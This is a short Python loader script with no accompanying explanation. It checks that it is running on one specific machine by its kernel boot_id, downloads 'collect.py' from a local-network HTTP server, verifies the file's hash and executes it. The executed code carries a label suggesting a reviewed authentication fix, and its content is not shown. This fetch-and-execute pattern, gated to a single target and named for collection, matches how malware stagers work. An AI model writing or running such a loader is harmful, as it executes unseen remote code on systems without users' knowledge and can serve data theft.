import hashlib,urllib.request
from pathlib import Path
assert Path('/proc/sys/kernel/random/boot_id').read_text().strip()=='0978088a-8d10-45b2-8f43-726d00209313'
b=urllib.request.urlopen('http://192.168.2.1:8765/collect.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='bf8e2effbe7a40a649b3244927cecff879fce4b39bd7c76713ac5ece0a81120d'
exec(compile(b,'reviewed_authfix_collect','exec'))
